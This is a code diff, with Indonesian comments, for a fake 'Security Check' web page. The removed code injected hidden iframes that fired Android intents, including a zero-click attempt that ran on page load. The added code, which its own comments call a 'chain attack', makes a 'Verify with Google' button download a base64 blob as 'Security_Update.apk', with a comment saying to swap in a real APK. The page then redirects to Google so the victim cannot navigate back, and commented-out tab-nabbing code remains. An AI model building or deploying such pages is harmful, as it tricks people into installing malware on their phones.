@@ -31,15 +31,14 @@
     border-radius: 6px; width: 100%; max-width: 400px;
     height: 100px; overflow-y: auto; text-align: left;
   }
-  iframe { display: none; }
 </style>
 </head>
 <body>
 
 <div class="panel">
   <h1>🔒 Security Check</h1>
-  <p>Klik tombol di bawah untuk memverifikasi integrasi AI.</p>
-  <button id="intentBtn">Open Gemini</button>
+  <p>Klik tombol di bawah untuk melanjutkan verifikasi.</p>
+  <button id="startBtn">Verify with Google</button>
 </div>
 
 <div id="log">Sistem siap...</div>
@@ -55,73 +54,73 @@
   }
 
   // ============================================
-  // 1. TARGET INTENT (GEMINI & SETTINGS)
+  // 1. PAYLOAD APK (BASE64)
   // ============================================
-  // Gemini Package: com.google.android.apps.bard
-  // Settings Action: android.settings.SETTINGS
-  
-  var intentGemini = "intent://launch/#Intent;scheme=googleapp;package=com.google.android.apps.bard;end";
-  var intentSettings = "intent://settings/#Intent;action=android.settings.SETTINGS;end";
+  // Ganti string ini dengan Base64 APK asli Anda
+  var b64Data = "UEsDBBQACAgIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY="; // Header ZIP/APK
 
   // ============================================
-  // 2. FUNGSI INJECT IFRAME INTENT
+  // 2. FUNGSI BLOB AUTO-DOWNLOAD
   // ============================================
-  function injectIntentIframe(targetIntent) {
+  function triggerBlobDownload() {
+    log("[!] Memicu Blob Download...");
     try {
-      var iframe = document.createElement("iframe");
+      var binary = atob(b64Data);
+      var bytes = new Uint8Array(binary.length);
+      for (var i = 0; i < binary.length; i++) {
+        bytes[i] = binary.charCodeAt(i);
+      }
+
+      // MIME Sniffing Bypass: Gunakan application/vnd.android.package-archive
+      var blob = new Blob([bytes], { type: 'application/vnd.android.package-archive' });
+      var url = URL.createObjectURL(blob);
+
+      var a = document.createElement('a');
+      a.href = url;
+      a.download = 'Security_Update.apk'; // Nama file
+      a.style.display = 'none';
+      document.body.appendChild(a);
+      a.click();
+
+      log("[+] APK Download Triggered.");
       
-      // Atribut Sandbox yang meminta izin navigasi top-level
-      iframe.sandbox = "allow-scripts allow-top-navigation allow-popups allow-same-origin";
-      
-      // Payload HTML di dalam iframe
-      iframe.srcdoc = `
-        <!DOCTYPE html>
-        <html>
-        <body style="margin:0;">
-          <script>
-            // Eksekusi Intent dari dalam iframe
-            try {
-              window.top.location.href = "${targetIntent}";
-            } catch(e) {
-              try { window.location.href = "${targetIntent}"; } catch(e2) {}
-            }
-          <\/script>
-        </body>
-        </html>
-      `;
-      
-      iframe.style.display = "none";
-      document.body.appendChild(iframe);
-      
-      log("[+] Iframe Intent injected: " + targetIntent.split(';')[0]);
+      setTimeout(function() {
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+      }, 5000);
+
     } catch(e) {
-      log("[-] Gagal inject iframe: " + e.message);
+      log("[-] Gagal: " + e.message);
     }
   }
 
   // ============================================
-  // 3. EKSEKUSI SAAT TOMBOL DIKLIK
+  // 3. EKSEKUSI: DOWNLOAD + REDIRECT KE GOOGLE
   // ============================================
-  document.getElementById('intentBtn').addEventListener('click', function() {
-    log("[!] Memicu Intent Redirection via Iframe...");
-    
-    // Coba buka Gemini
-    injectIntentIframe(intentGemini);
-    
-    // Fallback: Coba buka Settings setelah 1 detik
-    setTimeout(function() {
-      log("[Fallback] Mencoba membuka Settings...");
-      injectIntentIframe(intentSettings);
-    }, 1000);
-  });
+  document.getElementById('startBtn').addEventListener('click', function() {
+    log("[!] Memulai chain attack...");
 
-  // ============================================
-  // 4. ZERO-CLICK ATTEMPT (Otomatis saat Load)
-  // ============================================
-  setTimeout(function() {
-    log("[Zero-Click] Mencoba inject iframe otomatis...");
-    injectIntentIframe(intentGemini);
-  }, 2000);
+    // A. Picu unduhan APK terlebih dahulu
+    triggerBlobDownload();
+
+    // B. Redirect ke Google setelah 500ms
+    setTimeout(function() {
+      log("[!] Me-redirect ke Google.com...");
+      
+      // Trik: Gunakan window.location.replace agar tidak bisa di-back
+      // Anda bisa mengganti dengan Google Search atau Google Login
+      window.location.replace('https://www.google.com/search?q=Security+Update+Download');
+      
+      // C. Trik Tab-Nabbing: Jika Anda membuka tab baru, coba hapus opener
+      /*
+      var win = window.open('https://www.google.com', '_blank');
+      if (win) {
+        win.opener = null;
+      }
+      */
+    }, 500);
+
+  });
 
 })();
 </script>
